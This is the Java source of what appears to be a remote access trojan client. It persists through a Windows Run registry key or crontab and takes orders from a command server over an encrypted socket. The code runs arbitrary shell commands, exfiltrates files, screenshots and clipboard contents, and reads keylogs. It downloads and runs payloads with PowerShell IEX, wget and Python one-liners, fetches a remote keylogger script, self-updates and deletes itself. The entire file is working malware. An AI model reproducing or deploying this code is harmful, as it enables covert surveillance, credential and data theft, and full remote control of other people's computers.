package Client;


import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.*;
import java.util.concurrent.TimeUnit;


public class Client {
    private static String HOST = "localhost";
    private static int PORT = 22122;
    private static boolean debugMode = true;
    private static final String SYSTEMOS = System.getProperty("os.name");
    private static boolean isPersistent = false;
    private static boolean autoSpread = false;
    private static DataOutputStream dos;
    private static File directory;
    private static DataInputStream dis;
    private static boolean keyLogger = false;
    private static String persistenceDir = System.getenv("APPDATA")+ "\\Desktop.jar";
    private static String aesKey = "";

    private static String keyLogFile = System.getProperty("java.io.tmpdir") + "log.txt";

    private static String USERNAME = System.getProperty("user.name");
    private static String JRE_VERSION = System.getProperty("java.version");
    private static String ARCH = System.getenv("PROCESSOR_ARCHITECTURE");


    public static void main(String[] args) throws Exception {
        /* Load server settings and then attempt to connect */
        Client client = new Client();
        client.loadServerSettings();
        if (isPersistent) {
            client.saveClient();
        }
        client.connect();
    }

    private static String getXrst() throws Exception {
        String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
        try (InputStream stream = Client.class.getResourceAsStream("/Client/.xrst");
             OutputStream resStreamOut = new FileOutputStream(jarFolder + "/.xrst")) {
            int readBytes;
            byte[] buffer = new byte[4096];
            while ((readBytes = stream.read(buffer)) > 0) {
                resStreamOut.write(buffer, 0, readBytes);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return jarFolder + "/.xrst";
    }

    private static void copyFile(File filea, File fileb) {
        InputStream inStream;
        OutputStream outStream;
        try {
            inStream = new FileInputStream(filea);
            outStream = new FileOutputStream(fileb);

            byte[] buffer = new byte[1024];

            int length;

            while ((length = inStream.read(buffer)) > 0) {
                outStream.write(buffer, 0, length);
            }

            inStream.close();
            outStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void saveClient() {
        File client = new File(getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
        if (SYSTEMOS.contains("Windows") && !new File(persistenceDir).exists()) {
            File newClient = new File(persistenceDir);
            copyFile(client, newClient);
            createPersistence(persistenceDir);
        }
    }

    private void createPersistence(String clientPath) {
        // For linux, use crontab: "(crontab -l 2>/dev/null; echo "*/5 * * * * $(which java) -jar jarfile") | crontab -"
        // For osx, use launchd:
        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");
        if (SYSTEMOS.toLowerCase().contains("lin")){
            pb = new ProcessBuilder("(crontab", "-l", "2>/dev/null;", "echo \"*/5 * * * * $(which java) -jar jarfile\")", "|", "crontab", "-");
        }

        try {
            Process proc = pb.start();
            proc.waitFor(2, TimeUnit.SECONDS);
            proc.destroyForcibly();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void connect() throws InterruptedException {
        Socket socket = null;
        try {
            socket = new Socket(HOST, PORT);
            dos = new DataOutputStream(socket.getOutputStream());
            dis = new DataInputStream(socket.getInputStream());

            if (debugMode){
                System.out.println(" === AES KEY: " + aesKey);
                System.out.println(" === Debug Mode: true");
                System.out.println(" === Host: " + HOST + ":" + PORT);
                System.out.println(" === Java version: " + JRE_VERSION);
                System.out.println(" === Keylogger: " + keyLogger);
            }

            // Start the keylogger if requested
            if (keyLogger){
                if (SYSTEMOS.toLowerCase().contains("win")){
                    // Download psh keylogger
                    String url = "https://gist.github.com/cbrnrd/7d84c7d979686e36c8e5691787042ac4/raw/3c8d76361c1d31d0375f00748a9af57d712c600c/keylog.ps1";
                    String fname = System.getProperty("java.io.tmpdir") + "\\" + randTextAlphaRestricted(8) + ".ps1";
                    String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fname + "'); powershell.exe -ExecutionPolicy Bypass -file " + fname;
                    Runtime.getRuntime().exec(cmd);
                }
            } else {
                Files.write(Paths.get(keyLogFile), "No keys available".getBytes());
            }

            while (true) {
                String input;
                try {
                    input = decrypt(dis.readUTF(), aesKey);
                    if (debugMode) {
                        System.out.println(input);
                    }
                } catch (EOFException e) {
                    break;
                }
                if (input.contains("CMD ")) {
                    exec(input.replace("CMD ", ""));
                } else if (input.contains("SYS")) {
                    communicate("SYS");
                    communicate(SYSTEMOS + "::" + InetAddress.getLocalHost().getHostName() + "\\" + USERNAME);
                } else if (input.contains("FILELIST")) {
                    communicate("FILELIST");
                    sendFileList();
                } else if (input.contains("DIRECTORYUP")) {
                    communicate("DIRECTORYUP");
                    directoryUp();
                } else if (input.contains("CHNGDIR")) {
                    communicate("CHNGDIR");
                    directoryChange();
                } else if (input.contains("DOWNLOAD")) {
                    sendFile();
                } else if (input.contains("SLEEP")) {
                    Thread.sleep(Long.parseUnsignedLong(input.split(" ")[1]) * 1000);
                    communicate("SLEEP");
                    if (debugMode){ System.out.println("Sleep over"); }
                } else if (input.contains("MSGBOX")) {
                    String[] split = Arrays.copyOfRange(input.split(" "), 1, input.split(" ").length);
                    StringBuilder toSet = new StringBuilder();
                    for (String w : split) {
                        toSet.append(w).append(" ");
                    }
                    String title = toSet.toString().split("::::::::::")[1];
                    showMessagebox(toSet.toString().split("::::::::::")[0], title);
                } else if (input.equals("SYINFO")) {
                    /*
                    "SYINFO" NOT A TYPO!!!!! Prevents clash with "SYS" command
                    SERVER: SYINFO
                    CLIENT: SYINFO
                    CLIENT: here's the info
                     */
                    getAndSendSysInfo();
                } else if (input.equals("READKEYLOG")){
                    /*
                    SERVER: READKEYLOG
                    CLIENT: READKEYLOG
                    CLIENT: len
                    CLIENT: read(keyLogFile)
                     */
                    communicate("READKEYLOG");
                    String content = new String(Files.readAllBytes(Paths.get(keyLogFile)));
                    dos.writeInt(content.length());
                    communicate(content);
                } else if (input.contains("DELFILE")){
                    File x = new File(Arrays.copyOfRange(input.split(" "), 1, input.split(" ").length)[0]);
                    x.delete();
                } else if (input.contains("CLIPSET")) {
                    /*
                    SERVER: CLIPSET "data"
                     */
                    String[] split = Arrays.copyOfRange(input.split(" "), 1, input.split(" ").length);
                    StringBuilder toSet = new StringBuilder();
                    for (String w : split) {
                        toSet.append(w).append(" ");
                    }
                    Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
                    // Give it a second to hook
                    Thread.sleep(200);
                    StringSelection selection = new StringSelection(toSet.toString());
                    sysClip.setContents(selection, selection);
                    if (debugMode) {
                        System.out.println("Clipboard set to: " + sysClip.getData(DataFlavor.stringFlavor));
                    }
                } else if (input.contains("CLIPGET")) {
                    /*
                    SERVER: CLIPGET
                    CLIENT: CLIPGET
                    CLIENT: clipdata
                     */
                    communicate("CLIPGET");
                    Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
                    Thread.sleep(200);
                    if (sysClip.getData(DataFlavor.stringFlavor).equals("") || sysClip.getData(DataFlavor.stringFlavor) == null){
                        communicate("No clipboard data");
                    }
                    communicate((String) sysClip.getData(DataFlavor.stringFlavor));

                } else if (input.contains("MSFWD")){
                    String url = input.split(" ")[2];
                    String target = input.split(" ")[1];
                    doWebDelivery(url, target);
                } else if (input.contains("VISIT")) {
                    if (debugMode) {
                        System.out.println("GOING TO: " + new URI(input.split(" ")[1]).toString());
                    }
                    Desktop.getDesktop().browse(new URI(input.split(" ")[1]));
                } else if (input.contains("SCREENSHOT")) {
                    communicate("SCREENSHOT");
                    // Next bytes of length n will be the image
                    // SERVER: SCREENSHOT
                    // CLIENT: filename
                    // CLIENT: b64.encode(file).length
                    // CLIENT: base64.encode(file).bytes.each
                    Robot robot = new Robot();
                    String format = "jpg";
                    String filename = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(12) + ".jpg";
                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                    BufferedImage fullImg = robot.createScreenCapture(screenRect);
                    ImageIO.write(fullImg, format, new File(filename));
                    if (debugMode){ System.out.println("Screenshot saved to: " + filename); }

                    // Done writing file, talk to server now

                    File imgFile = new File(filename);
                    communicate(filename.substring(filename.lastIndexOf(File.separator))); // Send filename ONLY, no path
                    long length = imgFile.length(); // get file length
                    dos.writeLong(length);

                    FileInputStream fis = new FileInputStream(imgFile);
                    BufferedInputStream bs = new BufferedInputStream(fis);

                    int fbyte;
                    while ((fbyte = bs.read()) != -1) {
                        dos.writeInt(fbyte);
                    }
                    bs.close();
                    fis.close();
                    if (debugMode){ System.out.println("Screenshot sent");}
                    //communicate(b64); // Send the encoded file
                } else if (input.contains("EXIT")) {
                    communicate("EXIT");
                    File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
                    if (SYSTEMOS.toLowerCase().contains("wind")){
                        Runtime.getRuntime().exec("powershell.exe \"Remove-Item -Force " + f.getAbsolutePath() + "\"");
                        String persPath = System.getenv("APPDATA") + "\\Desktop.jar";
                        Runtime.getRuntime().exec("cmd.exe /c REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + persPath + "\"");
                    } else {
                        Runtime.getRuntime().exec("rm -rf " + f.getAbsolutePath());
                    }
                    socket.close();
                    System.exit(0);
                } else if (input.contains("PSHURL")) {
                    /*
                    Server: PSHURL url
                    Client: PSHURL
                    Client: output[0]\n
                    Client: output[1]\n
                    ...
                    Client: ENDPSH
                    Could just use dae
                     */
                    communicate("PSHURL");
                    URL url = new URL(input.split(" ")[1]);
                    String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".ps1";

                    try(BufferedInputStream in = new BufferedInputStream(url.openStream());
                        FileOutputStream fileOutputStream = new FileOutputStream(fname)){
                        byte[] dataBuffer = new byte[2048];
                        int bytesRead;
                        while ((bytesRead = in.read(dataBuffer, 0, 2048)) != -1){
                            fileOutputStream.write(dataBuffer, 0, bytesRead);
                        }
                        if (debugMode) {
                            System.out.println("Filename: " + fname);
                        }
                    } catch (IOException ioe){
                        if (debugMode){ ioe.printStackTrace(); }
                    }

                    String cmd = "powershell.exe . " + fname;
                    if (debugMode){System.out.println("Command: " + cmd);}

                    // Run the command
                    File outFile = new File(System.getProperty("java.io.tmpdir") + "GCDout.csv");
                    outFile.createNewFile();
                    ProcessBuilder builder = new ProcessBuilder(cmd.split(" "));
                    builder.redirectErrorStream(true);
                    Process proc = builder.start();

                    BufferedReader termOutput = new BufferedReader(new
                            InputStreamReader(proc.getInputStream()));
                    String firstLine = termOutput.readLine();
                    if (firstLine.contains("Cannot parse Data files while chrome is running"))
                        communicate(firstLine);
                    // Read file
                    BufferedReader stdInput = new BufferedReader(new FileReader(outFile));
                    String s = null;
                    while ((s = stdInput.readLine()) != null){
                        communicate(s);
                        if (debugMode){System.out.println("Got line: " + s);}
                    }
                    communicate("ENDPSH");
                } else if (input.equals("UPDATE")){
                    long len = dis.readLong();
                    String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".jar";
                    File newClientFile = new File(fname);
                    if (debugMode){ System.out.println("Update client saved to: " + fname); }
                    FileOutputStream fos = new FileOutputStream(newClientFile);
                    BufferedOutputStream bos = new BufferedOutputStream(fos);
                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
                    bos.close();
                    fos.close();
                    // streams closed, shut down current connections and start up new client
                    dos.close();
                    dis.close();
                    socket.close();

                    // Start new client
                    Runtime.getRuntime().exec("java -jar " + fname);
                    if (debugMode) { System.out.println("Exiting"); }
                    System.exit(0);

                } else if (input.contains("PLUGIN")){
                    long len = dis.readLong();
                    String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".jar"; // it will be a jar
                    File newClientFile = new File(fname);
                    if (debugMode){ System.out.println("Plugin saved to: " + fname); }
                    FileOutputStream fos = new FileOutputStream(newClientFile);
                    BufferedOutputStream bos = new BufferedOutputStream(fos);
                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
                    bos.close();
                    fos.close();

                    // Run jar and get/send output
                    String output = "";
                    String cmd = "java -jar " + fname;
                    Scanner s = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
                    output =  s.hasNext() ? s.next() : "No output";
                    communicate(output);

                } else if (input.contains("DAE")){
                    communicate("DAE");
                    String url = input.split(" ")[1];
                    String fname = randTextAlpha(8) + url.substring(url.lastIndexOf('.'));
                    // Attempts to download and execute a binary. If it is successful, send back `1`, else `0`.
                    if (SYSTEMOS.contains("Windows")){
                        String fpath = System.getProperty("java.io.tmpdir") + fname;
                        String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fpath + "');Start-Process '" + fpath + "';Remove-Item -force " + fpath;
                        if (debugMode){System.out.println("CMD: " + cmd);}
                        Runtime.getRuntime().exec(cmd);
                        communicate(0);
                    } else {
                        // Probably bash/sh. Use sh just to be safe
                        if (fname.lastIndexOf('.') != 3 || fname.lastIndexOf('.') != 4) // probably doesnt have an extension
                            fname = url.substring(url.lastIndexOf('/') + 1);
                        String fpath = System.getProperty("java.io.tmpdir") + File.separator + fname;
                        String cmd = "wget '"+ url + "' -O " + fpath + "; chmod +x " + fpath + "; " + fpath;
                        int status = 0;
                        Runtime.getRuntime().exec(cmd);
                        if (debugMode){System.out.println("CMD: " + cmd);}
                        communicate(status);
                    }
                    communicate(1);
                } else if (input.contains("UAE")){
                    // Save file, execute it according to OS
                    long len = dis.readLong();
                    String fname = System.getProperty("java.io.tmpdir") + File.separator + input.split(";;")[1];
                    File sent = new File(fname);
                    FileOutputStream fos = new FileOutputStream(sent);
                    BufferedOutputStream bos = new BufferedOutputStream(fos);
                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
                    bos.close();
                    fos.close();

                    Desktop.getDesktop().open(sent);
                } else if (input.equals("SHUTDOWN")){
                    communicate("EXIT"); // Tell server that client is leaving
                    socket.close();
                    if (SYSTEMOS.contains("wind")){
                        Runtime.getRuntime().exec("shutdown.exe -s -t 0");
                    } else {
                        //linux or mac
                        Runtime.getRuntime().exec("shutdown -h now");
                    }

                }
            }
        } catch(SocketException se){
            if (debugMode){
                se.printStackTrace();
            }
            Thread.sleep(1000);
            connect();
        } catch (Exception e) {
            if (debugMode){
                e.printStackTrace();
            }
            assert socket.getClass() == Socket.class;
            try{socket.close();}catch(IOException i){i.printStackTrace();}

            Client client = new Client();
            if (isPersistent) {
                client.saveClient();
            }
            client.connect();

        }
    }

    private void communicate(String msg) {
        try {
            String toSend = encrypt(msg, aesKey);
            dos.writeUTF(toSend);
        } catch (Exception e) {
            if (debugMode) {
                e.printStackTrace();
            }
        }
    }

    private void communicate(int msg) {
        try {
            String toSend = encrypt(String.valueOf(msg), aesKey);
            dos.writeUTF(toSend);
        } catch (Exception e) {
            if (debugMode) {
                e.printStackTrace();
            }
        }
    }

    // To be used for binary file transfers
    private void communicate(byte[] msg){
        try{
            dos.write(msg);
        } catch (IOException e){
            if (debugMode) {
                e.printStackTrace();
            }        }
    }

    private void exec(String command) {
        if (!command.equals("")) {
            try {
                ProcessBuilder pb = null;
                if (SYSTEMOS.contains("Windows")) {
                    pb = new ProcessBuilder("cmd.exe", "/c", command);
                } else if (SYSTEMOS.contains("Linux")) {
                    pb = new ProcessBuilder(command);
                }
                if (pb != null) {
                    pb.redirectErrorStream(true);
                }
                Process proc = pb.start();
                try {
                    BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                    ArrayList<String> output = new ArrayList<>();
                    String line;
                    while ((line = in.readLine()) != null) {
                        output.add(line);
                    }
                    proc.waitFor();
                    communicate("CMD");
                    communicate(output.size());
                    for (String s : output) {
                        communicate(s);
                    }
                } catch (IOException | InterruptedException e) {
                    if (debugMode) { e.printStackTrace(); }
                    exec("");
                }
            } catch (IOException e) {
                if (debugMode) { e.printStackTrace(); }
                exec("");
            }
        }
    }


    private int execNoComm(String cmd){
        if (!cmd.equals("")) {
            try {
                ProcessBuilder pb = null;
                if (SYSTEMOS.contains("Windows")) {
                    pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                } else if (SYSTEMOS.contains("Linux")) {
                    pb = new ProcessBuilder();
                }
                if (pb != null) {
                    pb.redirectErrorStream(true);
                }
                Process proc = pb.start();
                try {
                    proc.waitFor();
                    return proc.exitValue();
                } catch (InterruptedException ie){
                    return 0;
                }
            } catch (IOException e) {
                exec("");
            }
        }
        return 0;
    }

    private void loadServerSettings() throws Exception {
        String filename = getXrst();
        Thread.sleep(100);
        File xrcs = new File(filename);
        try (BufferedReader reader = new BufferedReader(new FileReader(xrcs))
        ) {
            String line;
            StringBuilder stringBuilder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
            }
            String[] settings = stringBuilder.toString().split(" ");
            if (settings.length == 8) {
                HOST = (settings[0]);
                // Change domain to ip
                try{
                    new URL(HOST);
                    HOST = InetAddress.getByName(HOST).getHostAddress();
                } catch (MalformedURLException e){
                    // Not a valid domain, it's an ip address. Leave it be
                }
                PORT = (Integer.parseInt(settings[1]));
                isPersistent = (Boolean.parseBoolean(settings[2]));
                autoSpread = (Boolean.parseBoolean(settings[3]));
                debugMode = (Boolean.parseBoolean(settings[4]));
                aesKey = settings[5];
                keyLogger = (Boolean.parseBoolean(settings[6]));
                if (!settings[7].equals("{{DEFAULT}}")) {
                    persistenceDir = settings[7];
                }
            }
        } catch (IOException e) {
            if (debugMode) {
                e.printStackTrace();
            }        }
        xrcs.delete();
    }

    private void directoryUp() {
        if (directory != null) {
            directory = directory.getParentFile();
        }
    }

    private void directoryChange() throws IOException {
        if (directory != null) {
            String directoryName = readFromDis(dis);
            directory = new File(directory.getAbsolutePath() + "/" + directoryName);
            directory.isDirectory();
        }
    }

    private void sendFileList() throws IOException{
        if (directory == null) {
            String directory = System.getProperty("user.home");
            Client.directory = new File(directory);
            Client.directory.isDirectory();
        }
        if (debugMode) {
            System.out.println(directory);
        }
        File[] files = new File(directory.getAbsolutePath()).listFiles();
        communicate(directory.getAbsolutePath());
        assert files != null;
        communicateInt(dos, files.length); // int
        for (File file : files) {
            String name = file.getName();
            communicate(name);
        }
        communicate("END");
    }


    private void sendFile() {
        try {
            communicate("DOWNLOAD");
            String fileName = readFromDis(dis);
            File f = new File(fileName);
            File filetoDownload;
            if (debugMode){ System.out.println("Sending " + fileName + "\n===\n" + f.getName()); }
            if (directory != null){ // If this isn't being called when the server is in the File Explorer, directory will be uninitialized (null)
                filetoDownload = new File(directory.getAbsolutePath() + File.separator + fileName);
            } else {
                filetoDownload = f;
            }

            Long length = filetoDownload.length();
            dos.writeLong(length);
            communicate(f.getName());

            FileInputStream fis = new FileInputStream(filetoDownload);
            BufferedInputStream bs = new BufferedInputStream(fis);

            int fbyte;
            while ((fbyte = bs.read()) != -1) {
                dos.writeInt(fbyte);
            }
            bs.close();
            fis.close();
            if (debugMode){ System.out.println("File sent");}
        } catch (IOException e) {
            if (debugMode) {
                e.printStackTrace();
            }
        }
    }

    private void sendFileAlone() {
        try {
            communicate("DOWNLOAD");
            String fileName = readFromDis(dis);
            if (debugMode){ System.out.println("Sending " + fileName); }
            File filetoDownload = new File(fileName);
            Long length = filetoDownload.length();
            dos.writeLong(length);
            communicate(fileName);

            FileInputStream fis = new FileInputStream(filetoDownload);
            BufferedInputStream bs = new BufferedInputStream(fis);

            int fbyte;
            while ((fbyte = bs.read()) != -1) {
                dos.writeInt(fbyte);
            }
            bs.close();
            fis.close();
        } catch (IOException e) {
            if (debugMode) {
                e.printStackTrace();
            }
        }
    }

    private void getAndSendSysInfo(){
        communicate("SYINFO");
        StringBuilder sb = new StringBuilder();
        sb.append("OS: " + SYSTEMOS + "\n");
        sb.append("Java version: " + JRE_VERSION + "\n");
        sb.append("Username: " + USERNAME + "\n");
        sb.append("Architecture: " + ARCH + "\n");
        sb.append("Encryption key: " + aesKey + "\n");
        sb.append("CPU: " + System.getenv("PROCESSOR_IDENTIFIER") + "\n");
        sb.append("  - CPU Cores: " + Runtime.getRuntime().availableProcessors() + "\n");
        try {
            InetAddress inetAddress = InetAddress.getLocalHost();
            sb.append("LAN IP: " + inetAddress.getHostAddress() + "\n");
            sb.append("Hostname: " + inetAddress.getHostName() + "\n");
        } catch (IOException ioe){}
        sb.append("$PATH: " + System.getenv("PATH") + "\n");
        sb.append("Free memory (bytes): " + Runtime.getRuntime().freeMemory() + "\n");
        long maxMemory = Runtime.getRuntime().maxMemory();
        sb.append("Max memory (bytes): " + (maxMemory == Long.MAX_VALUE ? "no limit" : maxMemory) + "\n");
        sb.append("Available JVM memory (bytes): " + Runtime.getRuntime().totalMemory() + "\n");

        File[] roots = File.listRoots();

        /* For each filesystem root, print some info */
        for (File root : roots) {
            sb.append("File system root: " + root.getAbsolutePath() + "\n");
            sb.append("Total space (bytes): " + root.getTotalSpace() + "\n");
            sb.append("Free space (bytes): " + root.getFreeSpace() + "\n");
            sb.append("Usable space (bytes): " + root.getUsableSpace() + "\n");
        }

        communicate(sb.toString());
    }

    private void showMessagebox(String msg, String title){
        if(debugMode){
            System.out.println("Showing messagebox with message: " + msg);
        }
        JFrame.setDefaultLookAndFeelDecorated(true);
        JFrame frame = new JFrame(title);
        frame.setAlwaysOnTop(true);
        frame.setAutoRequestFocus(true);
        frame.setEnabled(true);

        JOptionPane.showMessageDialog(frame, msg, title, JOptionPane.INFORMATION_MESSAGE);
    }

    public void doWebDelivery(String url, String target){
        String cmd = "";
        if (debugMode){ System.out.println("Web Delivery target: " + target); }
        switch (target){
            case "python":
                if (SYSTEMOS.contains("Windows")){
                    cmd = "python.exe -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(" + url + "');exec(r.read());\"";
                } else {
                    cmd = "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(" + url + "');exec(r.read());\"";
                }
            case "powershell":
                cmd = "powershell.exe -nop -w hidden -c $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('" + url + "');";
        }
        if (debugMode){
            System.out.println("Executing cmd: " + cmd);
        }
        execNoComm(cmd);
    }

    /// Util functions \\\
    public String randTextAlpha(int length){
        int leftLimit = 65; // letter 'A'
        int rightLimit = 122; // letter 'z'
        Random rand = new Random();
        StringBuilder buffer = new StringBuilder();
        for (int i = 0; i < length; i++){
            int randomLimitedInt = leftLimit + (int)
                    (rand.nextFloat() * (rightLimit - leftLimit + 1));
            if (randomLimitedInt == 92 ){ // `\` char
                i = i - 1;
                continue;
            }
            buffer.append((char) randomLimitedInt);
        }
        return buffer.toString();
    }

    public String randTextAlphaRestricted(int length){
        int leftLimit = 97; // letter 'a'
        int rightLimit = 122; // letter 'z'
        Random rand = new Random();
        StringBuilder buffer = new StringBuilder();
        for (int i = 0; i < length; i++){
            int randomLimitedInt = leftLimit + (int)
                    (rand.nextFloat() * (rightLimit - leftLimit + 1));
            buffer.append((char) randomLimitedInt);
        }
        return buffer.toString();
    }

    public static String encrypt(String data, String key) {
        byte[] encryptedValue;
        try {
            Key keyVal = generateEncryptionKey(key.getBytes());
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keyVal);
            encryptedValue = cipher.doFinal(data.getBytes());
        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e){
            e.printStackTrace();
            return null;
        }
        return Base64.getEncoder().encodeToString(encryptedValue);
    }

    public static String decrypt(String data, String key) {
        byte[] decValue = {};
        try {
            Key encryptionKey = generateEncryptionKey(key.getBytes());
            Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
            c.init(Cipher.DECRYPT_MODE, encryptionKey);
            byte[] decodedValue = Base64.getDecoder().decode(data);
            decValue = c.doFinal(decodedValue);
        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e){
            e.printStackTrace();
        }
        return new String(decValue);
    }

    private static Key generateEncryptionKey(byte[] key){
        return new SecretKeySpec(key, "AES");
    }


    public static String readFromDis(DataInputStream dis) throws IOException{
        return decrypt(dis.readUTF(), aesKey);
    }

    public static void communicateInt(DataOutputStream dos, int i) throws IOException{
        dos.writeInt(i);
    }
}
